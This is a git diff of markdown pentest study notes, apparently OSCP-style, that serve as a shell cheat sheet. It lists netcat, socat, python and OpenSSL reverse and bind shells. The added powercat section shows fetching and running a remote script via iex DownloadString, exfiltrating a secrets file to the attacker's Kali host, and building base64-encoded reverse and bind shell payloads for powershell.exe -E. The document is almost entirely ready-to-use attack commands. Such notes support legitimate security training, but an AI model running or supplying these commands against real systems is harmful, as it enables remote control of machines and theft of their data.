@@ -31,7 +31,7 @@ Victim connnects and attacker listens. Used 95% of the time.
 	- attacker runs: `nc -nlvp 4444`
 	- victim runs: `nc -nv {ip-address} 4444 -e /bin/bash` 
 
-- socat
+- socat (unencrypted)
 	- attacker runs: `sudo socat -d -d  TCP4-LISTEN:4444 STDOUT`
 	- victim runs (linux): `socat TCP4:{ip-address}:4444 EXEC:/bin/bash`
 	- victim runs (windows): `socat TCP4:{ip-address}:4444 EXEC:cmd.exe,pipes`
@@ -49,8 +49,6 @@ Victim connnects and attacker listens. Used 95% of the time.
 	- attacker runs: `nc -nlvp 4444`
 	- victim runs: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("PUT-IP-HERE",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-- upgrade a bad shell with pty: `python -c 'import pty; pty.spawn("/bin/bash")'` 
-
 ## Bind Shells
 Victim listens and attacker connects. Useful when bypassing firewalls or when reverse shells "just don't work".
 
@@ -63,7 +61,7 @@ Victim listens and attacker connects. Useful when bypassing firewalls or when re
 	- victim runs (windows): `socat -d -d TCP4-LISTEN:443 EXEC:cmd.exe,pipes`
 	- attacker runs: `socat - TCP4:{ip-address}:4444`
 
-## Encrypted shells with OpenSSL
+## Encrypted shells with OpenSSL & Socat
 Utilize SSL certificates to encrypt data sent between hosts
 
 ### Generate the cert
@@ -84,6 +82,55 @@ Utilize SSL certificates to encrypt data sent between hosts
 	- `socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork EXEC:cmd.exe,pipes`
 - attacker socat SSL connection to listener (linux)
 	- `socat - OPENSSL:{ip-address}:443,verify=0`
+
+## Shells with powercat
+[powercat](https://github.com/besimorhino/powercat) is basically a powershell version of netcat. 
+
+### Setup
+- load powercat into the powershell instance
+	- after file transfer from kali: `. .\powercat.ps1`
+	- download if the victim has internet access `iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`
+	- Scripts loaded in this way will only be available in the current PowerShell instance and will need to be reloaded each time we restart PowerShell.
+
+### powercat file transfers
+- exfiltrate secrets from a windows victim to kali
+	- attacker listening for files:
+		- `sudo nc -nlvp 443 > secrets.txt`
+	- victim using powercat
+		- `powercat -c {kali-ip} -p 443 -i C:\Users\Offsec\secrets.txt`
+	- hangs? had to hit ctrl c on windows, but the file was fine :shrug:
+
+### powercat reverse shell
+- attacker runs: `sudo nc -lvp 443`
+- victim runs `powercat -c {ip-address} -p 443 -e cmd.exe`
+
+### powercat bind shell
+- victim listener runs: `powercat -l -p 443 -e cmd.exe`
+- attacker kali runs: `nc -nv {ip-address} 443`
+
+### reverse shell with encoded payload
+Powercat can also generate stand-alone payloads. In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user. You **CANNOT** pass filename to `powershell.exe -E` , must use the encoded string.
+
+- attacker sets up listener `sudo nc -nlvp 443`
+- victim creates payload in powershell
+```
+powercat -c {attacker-ip} -p 443 -e cmd.exe -ge > enc_payload.ps1
+```
+- victim copies base64 encoded string from enc_payload.ps1 and passes it to `powershell.exe -E` (run from powershell) 
+	- `powershell.exe -E {base64-payload}` 
+		- this seems super finnicky. don't use double quotes for payload and include any newlines in copy/paste 
+
+### bind shell with encoded payload
+Similar to encoded reverse shells, you **CANNOT** pass filename to `powershell.exe -E` , must use the encoded string.
+- victim creates encoded bind payload 
+	- `powercat -l -p 443 -e cmd.exe -ge > enc_bindpayload.ps1`
+- victim runs in powershell the listener `powershell.exe -E {base64-payload}`
+	- no quotes, include newlines, had to press enter one extra time after running the command
+- attacker connects from kali
+	- `nc -nv {victim-ip} 443`
+
+## Shell upgrades
+- upgrade a bad shell with pty: `python -c 'import pty; pty.spawn("/bin/bash")'` 
 
 ## Other Windows Shell-like options
 - RDP
